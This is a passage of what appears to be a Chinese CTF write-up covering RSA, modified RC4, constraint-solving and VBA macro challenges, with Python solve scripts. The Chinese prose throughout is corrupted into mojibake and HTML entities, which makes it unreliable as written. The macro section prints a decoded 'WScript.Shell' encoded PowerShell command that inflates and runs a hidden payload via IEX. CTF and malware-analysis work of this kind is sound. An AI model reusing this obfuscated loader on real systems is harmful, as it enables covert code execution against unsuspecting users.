æ³•è§£ç çš„å­—ç¬¦ print(f&quot;&#123;tag&#125;: &#123;data.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)&#125;&quot;, end=&quot;&quot;) except Exception: # å¦‚æœè§£ç å¤±è´¥ï¼Œæ‰“å°åå…­è¿›åˆ¶è¡¨ç¤º print(f&quot;&#123;tag&#125; (hex): &#123;data.hex()&#125;&quot;)def main(): &quot;&quot;&quot;ä¸»å‡½æ•°ï¼Œä¾æ¬¡æ‰§è¡Œä¸‰ä¸ªæŒ‘æˆ˜çš„è§£å¯†ä»»åŠ¡ã€‚&quot;&quot;&quot; # Flag1: ç›´æ¥ä½¿ç”¨ç»™å®šçš„ n1, d1 è§£å¯† c1 = read_cipher(&quot;flag1.txt&quot;) pt1 = rsa_decrypt_with_d(n1, d1, c1) try_print(&quot;Flag1&quot;, pt1) # Flag2: ä½¿ç”¨æ³„éœ²çš„ dp2 è§£å¯† c2 = read_cipher(&quot;flag2.txt&quot;) pt2 = rsa_decrypt_with_dp(n2, e2, dp2_hex, c2) try_print(&quot;\\nFlag2&quot;, pt2) # Flag3: ä½¿ç”¨æ³„éœ²çš„ dp3 è§£å¯† c3 = read_cipher(&quot;flag3.txt&quot;) pt3 = rsa_decrypt_with_dp(n3, e3, dp3_hex, c3) try_print(&quot;\\nFlag3&quot;, pt3) print() # æ¢è¡Œif __name__ == &quot;__main__&quot;: main() flag{You_do_have_a_good_understanding_of_certificate_formats_and_the_RSA_algorithm.} ä¸‰é‡ç§˜å½±-wgbä¸€å…±æœ‰ä¸‰ä¸ªåŠ å¯† è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå›¾ç‰‡ï¼ŒæŠŠå®ƒä¹Ÿæå–å‡ºæ¥ è§£å¯†å¾—åˆ°9273016854 æœ€åè¿˜æœ‰ä¸€ä¸ªbase64 æœ€åSM4è§£å¯† flag{a8d2f9b1c3e7g6h4i5j} reversere1-NewRC4-wgbå…ˆæŸ¥å£³ï¼Œçœ‹åˆ°UPXï¼Œè¿™ä¸ªæ˜¯é­”æ”¹äº† ç”¨010æ‰“å¼€ï¼ŒæŠŠVMPéƒ½æ”¹æˆUPXå°±å¥½äº† ç”¨upx å‘½ä»¤è„±å£³ï¼Œç„¶åæ”¾åˆ°IDAé‡Œé¢è¿›è¡Œé€†å‘åˆ†æ è¿™ä¸ªå¯†æ–‡æ˜¯é”™çš„ï¼Œå®ƒä½¿ç”¨äº†TLSå›è°ƒï¼Œä¼šä¿®æ”¹keyçš„å€¼ï¼Œå¦‚æœåŠ¨æ€è°ƒè¯•ä¹Ÿä¼šè¢«æ£€æµ‹å‡ºæ¥ï¼Œkeyè¿˜ä¼šè¢«ä¿®æ”¹ é‚£ä¹ˆçœŸæ­£çš„keyå°±æ˜¯ é‚£ä¸€ä¸²nbGvzyHebFGcV8auYoqe ä¸ 0x7aå¼‚æˆ– è¿™ä¸ªå¾ˆæ˜æ˜¾æ˜¯rc4é­”æ”¹äº† éƒ½åœ¨åé¢åŠ ä¸Šäº†113 ç›´æ¥å†™å‡ºè„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import structdef solve(): key = [0x14,0x18,0x3d,0x0c,0x00,0x03,0x32,0x1f,0x18,0x3c,0x3d,0x19,0x2c,0x42,0x1b,0x0f,0x23,0x15,0x0b,0x1f] key_len = len(key) # æ¨¡æ‹ŸRC4çš„KSA (å¯†é’¥è°ƒåº¦ç®—æ³•) S = list(range(256)) T = [key[i % key_len] for i in range(256)] j = 0 for i in range(256): j = (j + S[i] + T[i]) % 256 S[i], S[j] = S[j], S[i] S_ksa_final = S[:] buf1_dwords = [ -1099083345, 2129584582, 1339278712, -1197737055, 632459247, -1426643507, -314991759, -1937737471, -1369194212, -269001761 ] buf1_word = 10008 ciphertext = b&#x27;&#x27; for d in buf1_dwords: ciphertext += struct.pack(&#x27;&lt;i&#x27;, d) ciphertext += struct.pack(&#x27;&lt;h&#x27;, buf1_word) ciphertext = ciphertext[:42] #æ¨¡æ‹Ÿå˜ç§RC4çš„PRGAå¹¶è§£å¯† plaintext = bytearray() i = 0 j = 0 for char_idx in range(len(ciphertext)): i = (i + 1) % 256 j = (j + S_ksa_final[i]) % 256 s_i_before_swap = S_ksa_final[i] S_ksa_final[i], S_ksa_final[j] = S_ksa_final[j], S_ksa_final[i] s_i_after_swap = S_ksa_final[i] t = (s_i_before_swap + s_i_after_swap) % 256 keystream_byte = S_ksa_final[t] # è§£å¯†å…¬å¼ dec_byte = ((ciphertext[char_idx] - 113) &amp; 0xFF) ^ keystream_byte plaintext.append(dec_byte) return plaintext.decode()if __name__ == &#x27;__main__&#x27;: try: flag = solve() print(f&quot;The flag is: &#123;flag&#125;&quot;) except Exception as e: print(f&quot; An error occurred: &#123;e&#125;&quot;) ç®—æ³•ç»„åˆ-wgbä½¿ç”¨IDAè¿›è¡Œé€†å‘åˆ†æ è¿™ä¸ªæ˜¯æœ‰å¤šä¸ªç®—æ³•æ¥é™åˆ¶flagçš„ï¼Œflagçš„é•¿åº¦æ˜¯20ï¼Œå¹¶ä¸”è¦æ±‚flag{}åŒ…è£¹ ç›´æ¥å–‚ç»™ai 1.æŠŠè¾“å…¥æŒ‰6æ®µåˆ‡å¼€å¹¶ä¾æ¬¡å‚ä¸åç»­æ ¡éªŒï¼š [0..4]â€f1ag{â€œ|[5..8]4å­—èŠ‚|[9..12]4å­—èŠ‚|[13]1å­—èŠ‚|[14..18]5å­—èŠ‚|[19] 2.AES-likeâ€å—æ ¡éªŒ ç”¨byte_BB400 AES S-boxå’Œdword_F6380(FIPS-197ç»å…¸ç¤ºä¾‹å¯†é’¥2B 7E 15 16 â€¦çš„æ´¾ç”Ÿè¡¨ï¼‰å¯¹å‰16å­—èŠ‚åš5è½®æ ·å¼çš„å˜æ¢ï¼Œç»“æœè¦åŒ¹é…å¸¸é‡xmmword_BB500ã€‚ ç»“åˆåç»­çº¦æŸï¼Œè¿™ä¸€å—æŠŠå‰16å­—èŠ‚å”¯ä¸€å¡æˆäº†ï¼š bâ€flag[r3v3rs3_1s_â€(ï¼ˆä¹Ÿå°±æ˜¯å†…å®¹ç¬¬0.15ä½ï¼‰ã€‚ å•å­—ç¬¦å‡¯æ’’+3ï¼Œè¦æ±‚å˜æ¢åçš„å­—ç¬¦ä¸²ç­‰äºâ€œ4â€ï¼Œä¸”åŸå­—ç¬¦å¾—æ˜¯æ•°å­—â†’ä¸‹æ ‡13å¿…ä¸º1â€ã€‚ 5å­—èŠ‚è‡ªå®šä¹‰64è¡¨æ˜ å°„+æ˜æ–‡ç›´æ¯”ã€‚ç»“æœå¿…é¡»æ˜¯â€œâ€zfm1uâ€ï¼› æ¥ç€ç¨‹åºåˆç›´æ¥æŠŠåŸå­—èŠ‚å’Œâ€s_funâ€åšé€å­—æ¯”è¾ƒâ†’ä¸‹æ ‡14.18ä¸ºâ€s_funâ€ã€‚ 4å­—èŠ‚å¼‚æˆ–å¸¸é‡ å¦ä¸€æ®µ4å­—èŠ‚ï¼ˆå¯¹åº”åˆ†æ®µå‘é‡çš„ç¬¬5&#x2F;6é¡¹ï¼Œè½åœ¨ä¸‹æ ‡9.12ï¼‰æ¯å­—èŠ‚0x42åè¦ç­‰äºå¸¸é‡ 493957424çš„â€œå°ç«¯â€å­—èŠ‚ä¸²ï¼Œå³bâ€™01q\\x1dâ€™ã€‚ 6.ç»Ÿè®¡çº¦æŸ æœ«å°¾è¿˜æœ‰ä¸€æ¡ï¼šæ•°å­—ä¸ªæ•°&gt;1ä¸”å…ƒéŸ³ï¼ˆaeiouï¼‰æ€»æ•°&gt;1ã€‚ r3v3rs3_1s_funé‡Œæœ‰æ•°å­—3â€å’Œâ€1â€™ä¸¤ä¸ªï¼›å…ƒéŸ³aâ€™ï¼Œâ€™uä¸¤ä¸ªï¼Œæ»¡è¶³ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788def rotp3(ch: str) -&gt; str: &quot;&quot;&quot;å‡¯æ’’ +3 åŠ å¯†&quot;&quot;&quot; o = ord(ch) if 97 &lt;= o &lt;= 122: # a-z return chr((o - 97 + 3) % 26 + 97) if 65 &lt;= o &lt;= 90: # A-Z return chr((o - 65 + 3) % 26 + 65) if 48 &lt;= o &lt;= 57: # 0-9 return chr((o - 48 + 3) % 10 + 48) return chdef inv_rotp3_to_make_4() -&gt; str: &quot;&quot;&quot;ç¬¬13ä½å­—ç¬¦ï¼šé€†è¿ç®—å¾—åˆ° rotp3(seg3) == &#x27;4&#x27; çš„åŸå­—ç¬¦&quot;&quot;&quot; o = ord(&#x27;4&#x27;) - 48 return chr((o - 3) % 10 + 48) # ç»“æœä¸º &#x27;1&#x27;def recover_seg2_from_xor() -&gt; str: &quot;&quot;&quot;ä¸‹æ ‡9..12çš„4å­—èŠ‚ï¼šæ¯å­—èŠ‚ ^0x42 åå¾—åˆ° b&#x27;01q\\x1d&#x27;ï¼Œåæ¨åŸå­—èŠ‚&quot;&quot;&quot; target = 493_957_424 # 0x1D713130 le = target.to_bytes(4, &#x27;little&#x27;) # b&#x27;\\x30\\x31\\x71\\x1d&#x27; raw = bytes([b ^ 0x42 for b in le]) return raw.decode(&#x27;latin1&#x27;) # è¿”å› &#x27;rs3_&#x27;def check(s: str) -&gt; bool: &quot;&quot;&quot;æ ¡éªŒ flag æ˜¯å¦æ»¡è¶³çº¦æŸ&quot;&quot;&quot; if len(s) != 20 or not s.startswith(&quot;flag&#123;&quot;) or s[-1] != &quot;&#125;&quot;: return False seg1 = s[5:9] seg2 = s[9:13] seg3 = s[13:14] seg4 = s[14:19] # å‰16å­—èŠ‚çº¦æŸ if s[:16] != &quot;flag&#123;r3v3rs3_1s_&quot;: return False # å•å­—ç¬¦ rotp3 ååº”ä¸º &#x27;4&#x27; if not seg3.isdigit() or rotp3(seg3) != &quot;4&quot;: return False # æ®µ4å¿…é¡»ä¸º &#x27;s_fun&#x27; if seg4 != &quot;s_fun&quot;: return False # æ®µ2æ¯å­—èŠ‚ ^0x42 == b&#x27;01q\\x1d&#x27; want = bytes([0x30, 0x31, 0x71, 0x1d]) got = bytes([ord(c) ^ 0x42 for c in seg2]) if got != want: return False # æ•°å­—&gt;1 ä¸”å…ƒéŸ³&gt;1 digits = sum(ch.isdigit() for ch in s) vowels = sum(ch in &quot;aeiou&quot; for ch in s) if not (digits &gt; 1 and vowels &gt; 1): return False return Truedef main(): head, tail = &quot;flag&#123;&quot;, &quot;&#125;&quot; seg1 = &quot;r3v3&quot; seg2 = recover_seg2_from_xor() # &#x27;rs3_&#x27; seg3 = inv_rotp3_to_make_4() # &#x27;1&#x27; seg4 = &quot;s_fun&quot; flag = f&quot;&#123;head&#125;&#123;seg1&#125;&#123;seg2&#125;&#123;seg3&#125;&#123;seg4&#125;&#123;tail&#125;&quot; # è‡ªæ£€ assert len(flag) == 20 assert flag.startswith(&quot;flag&#123;&quot;) and flag.endswith(&quot;&#125;&quot;) assert seg2 == &quot;rs3_&quot; assert seg3 == &quot;1&quot; assert seg4 == &quot;s_fun&quot; assert sum(ch.isdigit() for ch in flag) &gt; 1 assert sum(ch in &quot;aeiou&quot; for ch in flag) &gt; 1 print(&quot;flag:&quot;, flag) print(&quot;check:&quot;, &quot;ok&quot; if check(flag) else &quot;FAIL&quot;)if __name__ == &quot;__main__&quot;: main() flag{r3v3rs3_1s_fun} æ»¡æ±Ÿçº¢-wgbè€ƒçš„æ˜¯VBAå® ä½¿ç”¨å‘½ä»¤olevba E:\\re\\ç½‘è°·æ¯\\æ»¡æ±Ÿçº¢.doc è¿™æ˜¯å¤šä¸ªbase64åŠ å¯†ï¼Œè§£å¯†é€»è¾‘æ˜¯ä½¿ç”¨äº†ä¸€ä¸ªå¤§çš„ Base64 ç¼–ç çš„å¯†é’¥ keyï¼Œç»“åˆæ•°ç»„ ciphertext è¿›è¡Œ XOR è§£å¯†ï¼Œç„¶åæ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ import base64â€‹# Base64 è§£ç  keydef base64decode(s): return base64.b64decode(s)â€‹# unxor å‡½æ•°def unxor(ciphertext, start, key): cleartext &#x3D; â€œâ€ for i in range(len(ciphertext)): cleartext +&#x3D; chr(key[i + start] ^ ciphertext[i]) return cleartextâ€‹# Base64 keyï¼ˆVBA ä¸­çš„æ‹¼æ¥å†…å®¹ï¼‰key_b64 &#x3D; ( â€œrFd10H3vao2RCodxQF2lbfkUAjIr&#x2F;6DL5qCnyC4p5EA0tEOXFafhhIdAIhum0XulB9+lU9wKRrDSWZ7XHGxFnPVUhqNK2DCnW8bI1MVWYxGhC4q5iFT5EzfCdTcWUu2+X9VTnKuwcOaIxVcmVyVjrWIRz4Dm3kecLNgAU8fZOKcu&#x2F;XuMXN85ZMKjd3Rv882RBUFmICvacdJ36Yojk5HAwYoBpjjjHydt4NwJisnXgtA3K+2xqGEBfAPmz73uyn7CxCKGt7xPUdc+oRoeY+oObiyzIEPQS3mhWffHsNBhkbrBz1os3xEgxuM3gN6Xa5SE7Zo6G7vMFeKdYops3DGQuyDY60v7KXscOCLxwqeRFC+buIRH69E90JdP7KSC4CDZhxlv&#x2F;cnX6HWdcWh7UTM7CWqzymtkqm&#x2F;3fjp76pGxscG40k&#x2F;M6UjaMnWg++oCkJZFMMenTvaxZ7GwyedlMxbOAtZ+INlBK+tPPIFbG42SRtmJH1e8Uz5p1E7h61vdxBklâ€ â€œl3sd196txhtnIlFZyHBc5IKXxHCbTa5hLl3CBpEgbn1I2FFhaEsYCtVyQrkdPmA5X6CuFhjuRacVoM131pMLVE7IQDG717EZ5BdiLOc4pb+5Q1iMAXfQQ6soJrjxM8ZgjzQYO5WuQkQFdfko6QZEa&#x2F;0QaqhysOozj&#x2F;sTeoj2wI2A0C&#x2F;bwV35cV5EXJNOawqbWJCXdwzdsD8QjNhiDYGYFicJIRD5MBshvm1RGv1CZz54n+ziSgGe2vJ6GMy4cWv+i+hy0&#x2F;shNgvhVcKuJfuPZuFUUHtqD3w07yZKj2ma+iKYCvIRO9nu8lYOQpbbowha1OyfGzx7BJkvJxth3b1xoJaiNMRwQZz&#x2F;fiC8zvYxTlB0bsIHKR07xgI8gfCDd+NIhwL3YbdAor7ZfHhH3jNhBTykOlyrc&#x2F;0yLQSTR8dx0BC9QMIerbSCqZ1Q4rUGEPiXIVvXjtrEhnSBTZW4U5uJHfGQbzlVuuRRCUAjyIzGCDHbDCjvEgwbNLLEzqdeJrh9â€ â€œ3K1WddVO4bwcKlQb14luWJzBsDwrD8u7vi8LTRIe6A982G0Oygf6+Am9m2GIkp6eSWY3tSF&#x2F;cOpmuWc+d1RCPzO5eEAm6TWT0ULWZ5QAMD31GObEpVRZ+eoCuDSckd0JvrP2lBSbZKRADL0unq3vhnmyTmflpvtH15ahJ+9mxgHGH2exGX6vgBx17iyx5T4WtBowQsIW310F1QrH6xNfvwM9PLv&#x2F;3czSXs&#x2F;&#x2F;jUDSB&#x2F;AN60pVccuZtfPvp+ZMg6d9l0UKNiWIq7CMKbE7Z7BWWjNEMBPdfGbNzmQULvHXOXpnlZeyNd0ht57x9PljoFDD6N+sEuJ2DRprg7&#x2F;qNZRJekOAF&#x2F;VIID2SPgDfCkRhLg+Xq5KgysBO4U5nWKGD0IM1TYcc24pbCY31beUlebiKc2aS7MtxQ+o41wQaJQ8Ys5h13jeNgpUz5Vzc6BGWDUm6+X+Jqu&#x2F;NK1qUy8Vmb5wXVl6BqFt6Y7yEGWv31QKTiVwyKWbuV+pRRYf3NvAqRX6nâ€ â€œd1zFmAyuzoiVe1masPkUUjz2+uacpn8DuVpKrDJF64UDt4yhEeBsLHykecS+&#x2F;r0pwEBGJdP&#x2F;Vd&#x2F;Y3OJ4MFUqnF9UvaYfrFG7trJQepnGH2DE4WTFna70hp9Fxx8LaJMI8lxfwBDxH5Z56kkF+j4hLuzq48vpQNId4tn+rFfFeHwp2GuZrVMkyQ1SVSDW9uUAjWu6ROhPEGwyjnjM2cG6MJQmphOD8bIfjGnOAscgU0d6FN0BHzRtx85xZwO1Vw&#x3D;&#x3D;â€)key &#x3D; base64decode(key_b64)â€‹# æ‰€æœ‰ ciphertext Arrayï¼ˆæŒ‰ç…§ VBA ä¸­é¡ºåºï¼‰arrays &#x3D; [ ([135, 46, 140, 24, 228, 225, 126, 169, 34, 40, 56], 3), ([201, 1], 14), ([137, 123, 117, 87, 89, 140, 200, 174, 138, 204, 135, 229, 75, 9, 168, 39, 117, 219, 2, 212, 118, 230, 128, 213, 197, 44, 99, 93, 193, 144, 49, 210, 70, 175, 228, 16, 187, 75, 36, 215, 144, 31, 223, 159, 127, 45, 9, 205, 183, 34], 16), ([199, 228, 3, 153, 81, 192, 25, 128, 137, 147, 136, 23, 7, 80, 224, 108, 203, 255, 197, 21, 174, 66, 117, 184, 52, 127, 71, 19, 183, 239, 29, 155, 18, 223, 159, 241, 35, 183, 202, 179, 22, 101, 99, 100, 54, 218, 32, 33, 142, 198, 175, 159, 29, 205, 110, 154, 65, 22, 247, 152, 91, 192, 108, 145, 58, 203, 25, 158, 99, 37, 128, 229, 54, 60, 38, 178, 134, 208, 68, 38, 39, 99, 76, 155, 56, 147, 53, 156, 203], 66), ([102, 198, 208, 164, 182, 203, 117, 231, 127, 219, 94, 126, 10, 162, 173, 72, 207, 156, 150, 219, 167, 117, 27, 172, 242, 233, 32, 72, 61, 65, 178, 142, 245, 133, 139, 29, 181, 134, 18, 199, 242, 233, 14, 5, 134, 127, 212, 91, 91, 8, 171, 90, 25, 109, 198, 97, 6, 157, 10, 45, 214, 27, 185, 134, 246, 145, 32, 196, 221, 131, 137, 27, 100, 146, 80, 67, 177, 161, 71, 193, 155, 175, 42, 192, 227, 172, 239, 123, 92], 155), ([234, 141, 79, 179, 223, 15, 203, 43, 171, 112, 201, 234, 98, 141, 170, 14, 174, 104, 46, 107, 122, 18, 176, 138, 238, 208, 78, 126, 217, 208, 197, 2, 219, 144, 118, 145, 213, 45, 173, 225, 233, 161, 66, 174, 198, 108, 46, 184, 249, 150, 178, 36, 223, 5, 41, 60, 105, 114, 110, 110, 40, 134, 139, 35, 41, 235, 57, 182, 60, 105, 58, 175, 196, 240, 224, 144, 250, 156, 14, 138, 217, 9, 147, 115, 55, 194, 186, 162, 79], 244), ([209, 193, 20, 114, 189, 230, 8, 167, 240, 61, 224, 242, 135, 166, 38, 7, 87, 151, 117, 148, 46, 97, 158, 117, 106, 143, 40, 126, 199, 26, 83, 196, 211, 16, 152, 203, 123, 22, 248, 60, 127, 38, 179, 12, 140, 170, 29, 148, 133, 77, 82, 213, 53, 92, 146, 151, 236, 151, 74, 37, 118, 16, 28, 157, 49, 18, 131, 195, 167, 133, 54, 214, 12, 248, 32, 108, 36, 131, 65, 250, 97, 12, 26, 10, 182, 16, 34, 15, 10], 333), ([81, 75, 148, 28, 3, 254, 84, 127, 57, 78, 30, 146, 239, 82, 115, 175, 20, 208, 87, 218, 140, 50, 189, 210, 111, 35, 12, 128, 1, 116, 208, 150, 230, 88, 166, 120, 35, 106, 166, 121, 243, 216, 251, 46, 25, 196, 102, 54, 130, 52, 233, 123, 103, 240, 146, 114, 144, 49, 205, 121, 89, 126, 226, 239, 23, 51, 71, 7, 184, 111, 154, 71, 39, 28, 191, 99, 43, 237, 59, 241, 187, 84, 205, 162, 82, 62, 227, 183, 145], 422), ([220, 194, 134, 110, 158, 136, 28, 157, 6, 28, 18, 29, 219, 15, 42, 69, 202, 26, 210, 214, 48, 60, 156, 210, 88, 81, 191, 153, 36, 72, 192, 205, 71, 101, 125, 96, 84, 172, 113, 120, 112, 252, 31, 16, 92, 180, 3, 4, 127, 58, 214, 173, 165, 31, 64, 250, 139, 176, 79, 89, 136, 249, 48, 37, 153, 201, 184, 51, 155, 186, 96, 121, 74, 163, 28, 131, 230, 74, 186, 237, 17, 163, 101, 17, 51, 1, 78, 40, 101], 511), ([173, 96, 11, 202, 44, 219, 158, 69, 217, 56, 179, 84, 118, 152, 185, 163, 20, 92, 3, 211, 142, 226, 92, 27, 150, 191, 222, 95, 105, 58, 87, 200, 109, 108, 90, 41, 190, 252, 39, 215, 215, 150, 117, 140, 19, 0, 206, 174, 60, 83, 253, 136, 153, 112, 28, 55, 54, 1, 131, 65, 74, 92, 97, 135, 64, 80, 192, 181, 183, 54, 130, 9, 197, 65, 182, 38, 196, 1, 248, 217, 155, 50, 57, 1, 135, 114, 53, 68, 126], 600), ([246, 123, 20, 204, 50, 152, 85, 111, 106, 210, 2, 247, 48, 159, 65, 255, 33, 131, 91, 157, 245, 204, 232, 223, 23, 163, 243, 109, 81, 181, 198, 99, 13, 150, 202, 151, 133, 228, 53, 192, 53, 212, 255, 30, 218, 222, 76, 176, 230, 46, 127, 0, 251, 133, 0, 75, 6, 98, 143, 221, 135, 70, 86, 153, 72, 105, 167, 91, 77, 86, 67, 240, 157, 143, 239, 49, 103, 247, 44, 158, 232, 23, 50, 225, 15, 179, 237, 94, 120], 689), ([21, 83, 142, 200, 60, 47, 222, 133, 241, 121, 102, 78, 134, 204, 252, 118, 74, 8, 97, 95, 138, 94, 62, 159, 44, 75, 147, 70, 175, 185, 75, 205, 218, 38, 251, 211, 199, 207, 11, 12, 118, 242, 74, 62, 19, 187, 36, 239, 38, 120, 58, 21, 17, 110, 113, 192, 57, 6, 111, 168, 102, 244, 147, 53, 151, 47, 247, 65, 123, 74, 183, 87, 167, 131, 236, 21, 60, 168, 168, 109, 249, 113, 164, 208, 138, 110, 252, 219, 183], 778), ([220, 77, 218, 41, 229, 2, 88, 252, 106, 253, 236, 187, 215, 59, 193, 15, 32, 150, 231, 159, 48, 149, 160, 224, 111, 182, 39, 147, 118, 135, 109, 38, 249, 118, 63, 205, 247, 94, 37, 175, 100, 222, 164, 108, 71, 245, 42, 113, 7, 181, 87, 188, 28, 71, 172, 75, 129, 136, 82, 8, 238, 65, 105, 125, 243, 190, 156, 168, 181, 28, 153, 190, 197, 25, 147, 84, 135, 79, 188, 11, 18, 30, 138, 195, 228, 177, 172, 230, 163], 867), ([116, 194, 246, 44, 213, 63, 75, 126, 78, 201, 230, 241, 205, 28, 240, 125, 46, 241, 50, 61, 113, 118, 113, 86, 190, 61, 41, 156, 140, 82, 85, 106, 154, 150, 116, 59, 37, 253, 214, 245, 112, 156, 68, 246, 220, 182, 181, 189, 58, 225, 9, 164, 170, 238, 237, 86, 187, 55, 95, 125, 41, 240, 254, 175, 112, 213, 7, 13, 2, 246, 86, 176, 29, 97, 105, 229, 127, 121, 158, 77, 51, 32, 116, 104, 213, 158, 211, 231, 161], 956), ([129, 43, 134, 12, 8, 25, 228, 210, 145, 230, 100, 15, 197, 93, 157, 207, 26, 89, 220, 180, 84, 164, 102, 26, 249, 193, 34, 39, 225, 173, 136, 48, 2, 189, 79, 149, 126, 91, 99, 100, 89, 230, 239, 55, 238, 118, 200, 215, 212, 103, 180, 29, 169, 169, 86, 253, 76, 43, 205, 184, 10, 200, 239, 162, 140, 127, 45, 214, 133, 132, 32, 46, 221, 66, 49, 28, 237, 233, 29, 55, 34, 233, 243, 91, 27, 182, 146, 58, 210], 1045), ([221, 59, 115, 92, 39, 169, 26, 171, 5, 50, 197, 131, 119, 184, 107, 4, 29, 192, 53, 48, 132, 208, 65, 239, 155, 255, 215, 11, 24, 223, 136, 184, 64, 53, 126, 130, 187, 163, 164, 231, 37, 66, 251, 28, 11, 234, 2, 4, 164, 226, 66, 129, 205, 228, 64, 161, 54, 125, 62, 224, 56, 131, 134, 191, 223, 120, 130, 17, 7, 109, 154, 190, 7, 142, 154, 136, 163, 62, 125, 20, 97, 205, 30, 51, 252, 229, 116, 237, 29], 1134), ([250, 244, 208, 17, 50, 212, 135, 122, 49, 134, 155, 37, 131, 204, 239, 166, 215, 221, 49, 134, 92, 63, 41, 197, 73, 176, 26, 30, 134, 119, 176, 123, 215, 56, 159, 8, 66, 175, 127, 67, 73, 174, 128, 162, 142, 209, 1, 136, 92, 160, 147, 191, 233, 99, 132, 42, 11, 107, 188, 42, 221, 194, 18, 107, 174, 79, 16, 20, 104, 155, 183, 188, 119, 207, 27, 251, 1, 131, 14, 91, 61, 115, 233, 57, 143, 178, 128, 246, 87], 1223), ([214, 95, 231, 84, 214, 176, 235, 78, 206, 44, 143, 68, 150, 97, 49, 48, 56, 82, 156, 68, 43, 117, 63, 134, 143, 30, 38, 64, 222, 22], 1312)]â€‹â€‹# æ‹¼æ¥è§£å¯†ç»“æœresult &#x3D; â€œâ€for arr, start in arrays: result +&#x3D; unxor(arr, start, key)â€‹print(â€œè§£å¯†ç»“æœ:â€, result)â€‹â€‹#è§£å¯†ç»“æœ: WScript.Shellpowershell -e LgAoACcAaQBlAFgAJwApACgAbgBFAHcALQBvAGIAagBFAGMAdAAgAFMAWQBzAHQAZQBNAC4ASQBvAC4AUwB0AFIAZQBBAE0AcgBlAGEAZABFAHIAKAAgACgAIABuAEUAdwAtAG8AYgBqAEUAYwB0ACAAIABTAHkAcwB0AEUATQAuAEkATwAuAEMATwBNAFAAUgBFAHMAcwBpAE8ATgAuAGQAZQBmAGwAYQBUAEUAUwB0AHIAZQBhAE0AKABbAEkAbwAuAE0AZQBtAG8AUgB5AHMAVABSAEUAQQBNAF0AIABbAHMAWQBzAFQAZQBNAC4AYwBPAG4AdgBFAHIAVABdADoAOgBmAFIATwBNAEIAQQBTAEUANgA0AFMAVAByAGkAbgBnACgAIAAnAGIAYwA2ADkAQwBzAEkAdwBHAEkAWABoAFAAVgBmAHgARwBSAHcAVQBMAEwAUwBrAGsAcwBsAEIAQgBYADkAQQBVAEIAdwBVAHAAOQBBAG0AbgA3AFEAUQBtADUAcQBrAFIAcABIAGUAdQB5ADAANgBPAHAAOABIAHoAbwB1AHkATQBFAEEAdgA2AEMAWQBRAEUATABSADUASQBKAHcAVwA4AHcARQBsAFoARgBoAFcAZABlAE4AaABCAGsAZgBNAFYATABRAHgAegBnAE0AOQBaAE0ANABGAFkAMQBVADMAbAAxAGMAWQAvAFUAaQBFAGQANgBDAHIAMwBYAHoAOQBEAG4ARQBRAHYARwBDAEMAMwBYAEsAbQBGAEYAUABpAGsAYQBjAGkAcQBVAFMASQByAFIASgBwAHcAKwBOAGIAeQBoAE8AWgBhAHYAMABTADcATQBsAGsAdwB6AHYAUwArAHoAbwBPAHoARQA0AEwAcAByAFcAWQBTAHAAdgBVAHYASwBWAGoAZQBCAE8AQQBzAHkAMAA5AFIAdgB2AEcAOQB6ADkAMABhAGEAeABGADYAYgB1ADYARgBsAEEANwAvAEUATwAyAGwAZgB5AGkAegBoAEQAeQBBAFEAPQA9ACcAKQAsACAAWwBzAFkAUwB0AEUATQAuAGkAbwAuAEMATwBNAFAAUgBlAFMAUwBpAG8ATgAuAGMATwBtAHAAcgBlAHMAUwBpAE8ATgBtAE8AZABFAF0AOgA6AEQAZQBDAG8AbQBQAHIARQBTAFMAKQAgACkALABbAHMAeQBzAFQARQBtAC4AVABFAFgAdAAuAGUAbgBjAE8AZABJAE4ARwBdADoAOgBBAHMAYwBpAEkAKQAgACkALgByAGUAYQBEAFQAbwBFAE4ARAAoACkA Base64 ç¼–ç çš„ PowerShell å‘½ä»¤ import base64â€‹encoded &#x3D; â€œLgAoACcAaQBlAFgAJwApACgAbgBFAHcALQBvAGIAagBFAGMAdAAgAFMAWQBzAHQAZQBNAC4ASQBvAC4AUwB0AFIAZQBBAE0AcgBlAGEAZABFAHIAKAAgACgAIABuAEUAdwAtAG8AYgBqAEUAYwB0ACAAIABTAHkAcwB0AEUATQAuAEkATwAuAEMATwBNAFAAUgBFAHMAcwBpAE8ATgAuAGQAZQBmAGwAYQBUAEUAUwB0AHIAZQBhAE0AKABbAEkAbwAuAE0AZQBtAG8AUgB5AHMAVABSAEUAQQBNAF0AIABbAHMAWQBzAFQAZQBNAC4AYwBPAG4AdgBFAHIAVABdADoAOgBmAFIATwBNAEIAQQBTAEUANgA0AFMAVAByAGkAbgBnACgAIAAnAGIAYwA2ADkAQwBzAEkAdwBHAEkAWABoAFAAVgBmAHgARwBSAHcAVQBMAEwAUwBrAGsAcwBsAEIAQgBYADkAQQBVAEIAdwBVAHAAOQBBAG0AbgA3AFEAUQBtADUAcQBrAFIAcABIAGUAdQB5ADAANgBPAHAAOABIAHoAbwB1AHkATQBFAEEAdgA2AEMAWQBRAEUATABSADUASQBKAHcAVwA4AHcARQBsAFoARgBoAFcAZABlAE4AaABCAGsAZgBNAFYATABRAHgAegBnAE0AOQBaAE0ANABGAFkAMQBVADMAbAAxAGMAWQAvAFUAaQBFAGQANgBDAHIAMwBYAHoAOQBEAG4ARQBRAHYARwBDAEMAMwBYAEsAbQBGAEYAUABpAGsAYQBjAGkAcQBVAFMASQByAFIASgBwAHcAKwBOAGIAeQBoAE8AWgBhAHYAMABTADcATQBsAGsAdwB6AHYAUwArAHoAbwBPAHoARQA0AEwAcAByAFcAWQBTAHAAdgBVAHYASwBWAGoAZQBCAE8AQQBzAHkAMAA5AFIAdgB2AEcAOQB6ADkAMABhAGEAeABGADYAYgB1ADYARgBsAEEANwAvAEUATwAyAGwAZgB5AGkAegBoAEQAeQBBAFEAPQA9ACcAKQAsACAAWwBzAFkAUwB0AEUATQAuAGkAbwAuAEMATwBNAFAAUgBlAFMAUwBpAG8ATgAuAGMATwBtAHAAcgBlAHMAUwBpAE8ATgBtAE8AZABFAF0AOgA6AEQAZQBDAG8AbQBQAHIARQBTAFMAKQAgACkALABbAHMAeQBzAFQARQBtAC4AVABFAFgAdAAuAGUAbgBjAE8AZABJAE4ARwBdADoAOgBBAHMAYwBpAEkAKQAgACkALgByAGUAYQBEAFQAbwBFAE4ARAAoACkAâ€ # ä½ 